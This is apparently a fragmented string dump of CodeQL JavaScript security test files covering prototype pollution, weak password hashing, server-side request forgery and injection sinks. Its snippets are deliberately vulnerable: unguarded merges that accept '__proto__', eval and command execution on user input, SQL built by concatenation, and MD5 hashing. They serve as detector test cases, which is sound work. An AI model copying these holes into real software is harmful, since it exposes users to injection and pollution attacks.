"__proto__"/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/path-assignment.jsisSafe"prototype"assignToPathassignToPathSafeassignToPathAfterLoopsplitHelperassignToPathWithHelperspltOnRegexp/\./functio ... ype";\n}{\n    r ... ype";\n}return  ... otype";key !== ... totype"key !== ... ructor"key !== "__proto__"key !== "prototype"let key ... t('.');keys =  ... it('.')path.split('.')i < keys.lengthkeys.lengthlet key = keys[i];key = keys[i]keys[i]if (i < ...       }i < keys.length - 1keys.length - 1if (!ta ...       }!target[key]target[key]target[key] = {};target[key] = {}target  ... t[key];target = target[key]target[key] = value;target[key] = valueif (!is ... return;!isSafe(key)isSafe(key)assignT ... terLooplet i;target  ...  || {};target  ... ] || {}target[ ... ] || {}target[key] || {}target[ ...  value;target[ ... = valuetarget[keys[i]]{\n    l ... sult;\n}let par ... : path;parts = ...  : pathtypeof  ...  : pathtypeof pathpath.sp ... || '.')sep || '.'let result = [];result = []result. ... parts);result. ... .parts)result.push...partsassignT ... hHelperlet key ... h, sep)keys =  ... h, sep)splitHe ... h, sep)let key ... (/\./);keys =  ... t(/\./)path.split(/\./)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingFunction/tests.js Guarding the recursive case by dst.hasOwnProperty is safe,// Guar ... s safe, since '__proto__' and 'constructor' are not own properties of the destination object.// sinc ... object. Guarding using src.hasOwnProperty is *not* effective,// Guar ... ective, since '__proto__' and 'constructor' are own properties in the payload.// sinc ... ayload. Not safe// Not safe Like copyUsingPlainForLoop, but with keys[i] duplicated at every use-site// Like ... se-site NOT OK - but not flagged NOT OK - object literal can flow here// NOT  ... ow here oops// oops Create a phi-node of refinement nodes// Crea ... t nodes Only 'prefs' is merged recursively// Only ... rsively OK - but flagged anyway due to imprecise barrier for captured variable// OK - ... ariable NOT OK - but not currently flagged Handle a few different ways to access src[key]// Hand ... rc[key] OK - but flagged anyway// OK - ...  anyway'somewhere'copyUsingForIncopyUsingKeyscopyRestsourcescopyRestAuxdstValuecopyProtoGuardedcopyCtorGuardedcopyDoubleGuardedcopyComplexcopyHasOwnPropertycopyHasOwnPropertyBad_hasOwnPropcopyHasOwnPropertyTearOffshallowExtendhigherOrderRecursionhigherOrderRecursionEntryinstanceofObjectGuardblacklistcopyWithBlacklistcopyUsingPlainForLoopcopyUsingPlainForLoopNoAliasdeepSetdeepSetCallermap1map2deepSetBaddeepSetCallerBadmaybeCopymergeWithCopycopyUsingEntriescopyUsingReflectcopyWithPathtypeofObjectTestmergeRephinementNodemergeSelective'prefs'isNonArrayObjectmergePlainObjectsOnlymergePlainObjectsOnlyNoClosureforEachPropmergeUsingCallbackmergeUsingCallback2wrappedReadcopyUsingWrappedReadalmostSafeReadcopyUsingAlmostSafeReadsafeReadcopyUsingSafeReadcopyUsingForOwnforOwn'for-own'copyUsingUnderscoreOrLodash'is-plain-object'copyPlainObjectcopyPlainObject2import  ... where';somewherecopyUsi ... [key]);copyUsi ... c[key]){\n    O ...   });\n}Object. ...     });Object. ... forEachObject.keys(src)key =>  ... }\n    }let sourcefor (le ...       }copyRes ... , key);copyRes ... ], key)source[key]let dst ... t[key];dstValue = dst[key]if (dst ... K\n    }copyRes ... value);copyRes ...  value)dst[key] = value;dst[key] = valuecopyPro ... [key]);copyPro ... c[key])copyCto ... [key]);copyCto ... c[key])key === ... roto__"copyDou ... [key]);copyDou ... c[key])if (isS ...       }copyCom ... [key]);copyCom ... c[key])copyHas ... [key]);copyHas ... c[key])copyHas ... ertyBadlet _ha ... operty;_hasOwn ... ropertycopyHas ... TearOffif (_ha ...       }_hasOwn ... t, key)_hasOwnProp.callfor (le ... K\n    }functio ...  src;\n}{\n    i ...  src;\n}if (typ ... n(src);typeof srcreturn fn(src);fn(src)src[key ... ], fn);src[key ... y], fn)transfo ... y], fn)return src;{\n    i ... sult;\n}if (typ ... rn src;let result = {};result = {}result[ ... [key]);result[ ... c[key])result[key]clone(src[key])callbac ... , key);callbac ... c, key)higherO ... onEntry{\n    h ...   });\n}higherO ...     });higherO ... \n    })(dst, s ... ;\n    }higherO ... [key]);higherO ... c[key])instanc ... ctGuardtypeof  ...  Objecttypeof dstValuedstValu ...  Objectinstanc ... [key]);instanc ... c[key])let bla ... ctor"];blackli ... uctor"]["__pro ... uctor"]if (bla ... ntinue;blackli ... y) >= 0blackli ... Of(key)blacklist.indexOfcopyWit ... [key]);copyWit ... c[key])copyUsi ... ForLooplet key ... s(src);keys =  ... ys(src)copyUsi ... NoAlias{\n    / ...     }\n}copyUsi ... s[i]]);copyUsi ... ys[i]])dst[keys[i]]src[keys[i]]dst[key ... ys[i]];dst[key ... eys[i]]!map[key1]map[key1]map[key ... (null);map[key ... e(null)map[key ...  value;map[key ... = valuemap[key1][key2]let map ... (null);map1 =  ... e(null)map2 =  ... e(null)deepSet ... [key]);deepSet ... a[key])data[key]functio ...  here\n}{\n    i ...  here\n}if (x & ... ;\n    }x && ty ... object'return {...x};{...x}...xif (dst ... rn src;dst == nulllet res ... y(dst);result  ... py(dst)maybeCopy(dst)if (src ...       }mergeWi ... c[key])Object.entries(src)entry = ... }\n    }let key = entry[0];key = entry[0]entry[0]let val ... try[1];value = entry[1]entry[1]copyUsi ... value);copyUsi ...  value){\n    R ...   });\n}Reflect ...     });Reflect ... \n    })Reflect ... forEachReflect.ownKeys(src)functio ...  dst;\n}{\n    f ...  dst;\n}copyWit ... : key);copyWit ...  : key)path ?  ... y : keypath + '.' + keypath + '.'let target = {};target = {}target[path] = {};target[path] = {}target[path]target[ ... c[key];target[ ... rc[key]target[path][key]doSomething(target);doSomething(target)return dst;let val ... c[key];value = src[key]dst[key ... object'typeof valuetypeofO ... value);typeofO ...  value)key === ... === keykey === keymergeRe ... value);mergeRe ...  value)key in  ... 'prefs'key in dstkey !== 'prefs'prefsmergeSe ... [key]);mergeSe ... c[key])functio ... tem);\n}{\n    r ... tem);\n}return  ... (item);item && ... y(item)item && ... object'typeof item!Array.isArray(item)Array.isArray(item)functio ... rget;\n}mergePl ... ctsOnly{\n    i ... rget;\n}if (isN ... ;\n    }isNonAr ... source)isNonAr ... target)Object.keys(source)key =>  ...       }key === '__proto__'if (isN ...       }isNonAr ...  targetisNonAr ... e[key])key in targettarget[ ... tions);target[ ... ptions)mergePl ... ptions)target[ ... e[key];target[ ... ce[key]return target;mergePl ... Closureif (isN ... }\n    }if (obj ...       }obj.has ... ty(key)callbac ... [key]);callbac ... j[key])forEach ...     });forEach ... \n    })mergeUs ... [key]);mergeUs ... c[key])(key, v ... }\n    }mergeUs ... value);mergeUs ...  value)functio ... key];\n}{\n    r ... key];\n}return obj[key];let val ... , key);value = ... c, key)wrapped ... c, key)let tar ... , key);target  ... t, key)wrapped ... t, key)if (tar ...       }{\n    i ... key];\n}if (key ... efined;return undefined;copyUsi ... afeReadalmostS ... c, key)almostS ... t, key)key === ... ructor'safeRead(src, key)safeRead(dst, key)let for ... -own');forOwn  ... r-own')import('for-own')for-ownforOwn( ...     });forOwn( ... \n    })(value, ... }\n    }if (som ... c[key];if (som ... o[key];dst[key] = o[key];dst[key] = o[key]o[key]if (som ...  value;copyUsi ... rLodash{\n    _ ...   });\n}_.each( ...     });_.each( ... \n    })_.eachlet isP ... ject');isPlain ... bject')require ... bject')is-plain-objectdst[key ... ct(src)isPlainObject(src)copyPla ... [key]);copyPla ... c[key])let tar ... t[key];target = dst[key]if (isP ...       }isPlain ... (value)isPlain ... target)isPlainObject(value)copyPla ... value);copyPla ...  value)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/angularmerge.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCalladdEven ...  OK\n});addEven ... T OK\n})(event) ... OT OK\n}{\n  ang ... OT OK\n}angular ... data));angular ... .data))angular.mergeJSON.pa ... t.data)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-non-vulnerable-lodash/package.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-non-vulnerable-lodash"4.17.12"4.17.12/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-non-vulnerable-lodash/tst.js'/hello'let _ = ... dash');/hello{\n    _ ... // OK\n}_.merge ... y.foo);_.merge ... ry.foo)_.merge/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-vulnerable-lodash/package.json/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-vulnerable-lodash"4.17.4"4.17.4/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-915/PrototypePollutingMergeCall/src-vulnerable-lodash/tst.js wrapped and unwrapped value// wrap ... d value_.merge ... query);_.merge ... .query)_.merge ...     });_.merge ... \n    })value:  ... y.valuereq.query.valuelet opt ... \n    };opts =  ... e\n    }thing:  ... y.valuevalue: opts.thingopts.thing/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-916/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-916"bcrypt"'aes192''md5'var pas ... ecret";password = "secret"require ... sword);require ... ssword)require ... ").hashrequire("bcrypt")bcryptrequire ... ).writerequire ... es192')require ... eCipheraes192require ... ha256')require ... ateHashrequire ... ('md5')md5/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-918/clientSideParam.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-918 OK - cannot manipulate path using `../`// OK - ... g `../` Possibly problematic, but not currently flagged.// Poss ... lagged."react-router-dom"'https://example.com/api/''/id'* as Reactimport  ... r-dom";react-router-domimport  ... quest';export  ... gged.\n}{\n    c ... gged.\n}const p ... rams();params = useParams()useParams()request ... '/id');request ...  '/id')'https: ... + '/id''https: ... ams.foo'https: ... m/api/'https://example.com/api/com/api/params.foo/idrequest(params.foo);request(params.foo)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-918/tst.js OK - assumed safe// OK - assumed saferequestPromise'request-promise'superagent'superagent'axios'axios'got'got'nodeFetchXhrIo'goog.net.XhrIo'Uri'goog.Uri'"http://""http://example.com""http://example.com/""http://example.com/?"relativeUrl'./config'http://example.com//v1/'http://example.com/'http://example.com/?CDP"chrome-remote-interface"ignoredfromURL'koa-route''/pets'param1param2param3'koa-router'routesws'ws'import  ... omise';request-promiseimport  ... agent';import  ... axios';import  ...  'got';let Xhr ... hrIo');XhrIo = ... XhrIo')goog.re ... XhrIo')goog.requiregoog.net.XhrIolet Uri ... .Uri');Uri = g ... g.Uri')goog.re ... g.Uri')goog.Urivar ser ... safe\n})server  ... safe\n})http.cr ... safe\n})functio ...  safe\n}{\n    v ...  safe\n}var tai ... ry.url;tainted ... ery.urlurl.par ... ery.urlrequest ... .com");request ... e.com")request(tainted);request(tainted)request ... inted);request.get(tainted)var options = {};options = {}options ... ainted;options ... taintedoptions.urlrequest(options);request(options)request ... ainted)"http://" + taintedhttp://"http:/ ... taintedhttp://example.com"http:/ ... e.com/""http:/ ... .com/?"http.ge ... nted});http.ge ... inted}){host: tainted}host: taintedXhrIo.s ... nted));XhrIo.s ... inted))XhrIo.sendnew Uri(tainted)new Xhr ... nted));new Xhr ... inted))new XhrIo().sendnew XhrIo()let bas ... ).base;base =  ... ').baserequire ... ').baserequire('./config')./config/configrequest ... ted}`);request ... nted}`)`http:/ ... inted}`'http:/ ... tainted'http:/ ... e + '/''http:/ ...  + base'http:/ ... e.com/'request ... nted));request ... inted))'http:/ ... ainted)('/' + tainted)'/' + tainted`${base}${tainted}`var CDP ... face");CDP = r ... rface")require ... rface")"chrome ... erface"chrome-remote-interfacevar ser ... \t});\n})server  ... \t});\n})http.cr ... \t});\n})async f ... \n\t});\n}{\n    v ... \n\t});\n}var cli ... tions);client  ... ptions)await CDP(options)CDP(options)client. ... nted});client. ... inted})client.Page.navigateclient.Page{url: tainted}url: taintedCDP(opt ... K.\t\n\t})CDP(opt ... }).thenCDP(opt ...  => {})CDP(options).catch(ignored) => {}(client ... OK.\t\n\t}{\n\t\tcli ... OK.\t\n\t}CDP(opt ... .\t\n\t});JSDOM.f ... inted);JSDOM.f ... ainted)JSDOM.fromURLvar rou ... oute');route = ... route')require('koa-route')koa-routeapp.use ... OK\n}));route.g ... T OK\n})route.get/pets(contex ... OT OK\n}{ \n     ... OT OK\n}JSDOM.f ... aram1);JSDOM.f ... param1)const r ... er')();router  ... ter')()require ... ter')()require ... outer')koa-routerrouter. ... }).postasync ( ... OT OK\n}{\n    J ... OT OK\n}JSDOM.f ... s.foo);JSDOM.f ... ms.foo)ctx.params.fooctx.paramsapp.use ... tes());app.use ... utes())router.routes()router.routesnew Web ... inted);new Web ... ainted)import  ... m 'ws';* as wsnew ws. ... });\n});new ws. ...  });\n})new ws. ... 0 }).onnew ws. ... 8080 })ws.Server{ port: 8080 }port: 8080functio ... l);\n  }{\n    c ... l);\n  }const u ... st.url;url = request.urlrequest.urlconst s ... s(url);socket = new ws(url)new ws(url)const u ...  base);url = n ... , base)new URL ... , base)const t ...  base);target  ... , base)url.pathname/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/Summaries/index.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/Summaries sink// sink this call should not make parameter `foo` a command injection sink// this ... on sink this call should not make the return value of `notATaintedSource` a remote flow source// this ...  source this call should not make the first argument to `cb` above a remote flow source Semmle: sink: taint, TaintedPath /* Semm ... Path */listenForHeaders'Hello World!'codeInjection"url[""]"commandInjection"ls "taintedPath"/tmp/"regexpInjxpathInjxxexmlBombhashPassunsafeDesremotePropinput1input2input3userIDsqlInj'SELECT '' AS solution''The solution is: 'solutioncreateErrorforLoopintObjnotASinktaintedSourcenotATaintedSourceinvokeremotePropeInjectionvar htt ... 'url');functio ... 080);\n}{\n  htt ... 080);\n}functio ... ();\n  }cb(cmd);cb(cmd)res.wri ... rld!');res.wri ... orld!')Hello World!functio ... ");  \n}{\n  eva ... ");  \n}eval("u ... + "]");eval("u ...  + "]")"url[" + input + "]""url[" + inputurl[functio ... t);  \n}{\n  req ... t);  \n}require ... input);require ...  input)"ls " + inputls functio ... put);\n}{\n  cod ... put);\n}codeInj ... input);codeInjection(input)command ... input);command ... (input){\n  req ... put);\n}"/tmp/" + input/tmp/functio ... "i");\n}{\n  new ... "i");\n}functio ... ut); \n}{\n  con ... ut); \n}parser.write(input);parser.write(input)functio ...  });\n\n}{\n  con ...  });\n\n}functio ... nput)\n}{  \n  r ... nput)\n}require ... (input){\n  con ... put);\n}return  ... input);jsyaml.load(input)functio ... t3;  \n}{\n  var ... t3;  \n}var obj ... nput1];obj = url[input1]url[input1]obj[inp ... input3;obj[input2] = input3obj[input2]functio ... });  \n}{\n  var ... });  \n}app.get ...  \n  });app.get ...   \n  })functio ...    \n  }{    \n  ...    \n  }res.sen ... serID);res.sen ... userID)"Unknow ...  userIDfunctio ... 0)\n  \n}{\n  var ... 0)\n  \n}var ser ... n(8080)server  ... n(8080)https.c ... n(8080)https.c ... .listenhttps.c ... );\n  }){    \n  ... });\n  }res.wri ... nput});res.wri ... input}){ Locat ...  input}Locatio ... + input'/' + input{  \n  v ...   });\n}var con ... '\n  });connect ... b'\n  })mysql.c ... b'\n  }){\n    h ... db'\n  }connect ... ;\n  });connect ... );\n  })'SELECT ' + inputSELECT  AS solution{\n    i ... n);\n  }if (err ...  error;throw error;console ... ution);console ... lution)The solution is: results[0].solutionresults[0]functio ...  err;\n}{\n  var ...  err;\n}var err, status;for (i  ...    \n  }i < 1000err = {};err = {}status  ... || err;status  ...  || errerr.a | ...  || errerr.a | ... | err.derr.a | ... | err.cerr.a || err.berr.aerr.berr.cerr.derr.a = ...  statuserr.b = statusreturn err;var intObj = {};intObj = {}var res = 0;res = 0for (va ... i];\n  }i < input.x.lengthinput.x.lengthinput.x{\n    r ... i];\n  }res +=  ... t.x[i];res +=  ... ut.x[i]intObj. ... ut.x[i]intObj.xinput.x[i]if (res ... rn res;res < 1000{\n    i ... bj;\n  }intObj.res = res;intObj.res = resintObj.resreturn intObj;functio ...  foo;\n}{\n  return foo;\n}return foo;eval(notASink(42));eval(notASink(42))notASink(42)notATai ... earch);notATai ... search)functio ... b(x);\n}{\n  cb(x);\n}cb(x);cb(x)invoke( ... earch);invoke( ... search)(x)=>xfunctio ... h(x);\n}{\n  h(x);\n}h(x);h(x)functio ... rn y;\n}{\n  return y;\n}return y;functio ... th */\n}{\n  pat ... th */\n}module. ... kdirp\n}{\n    c ... kdirp\n}codeInj ... jectioncommand ... jectionremoteP ... otePropmultiple: multipletainted ... tedPathsqlInj: sqlInjlisten: ... HeaderscreateE ... teErrorregexpInj: regexpInjxpathInj: xpathInjxmlBomb: xmlBombhashPass: hashPassxxe: xxeunsafeDes: unsafeDesredirect: redirectreflected: reflectednotASink: notASinktainted ... dSourcenotATai ... dSourceinvoke: invokeg: gh: hmkdirp: mkdirp/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/Summaries/package.json"infer-sources"infer-sources"2.15.0"2.15.0"0.0.27"0.0.27"0.19.1"0.19.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                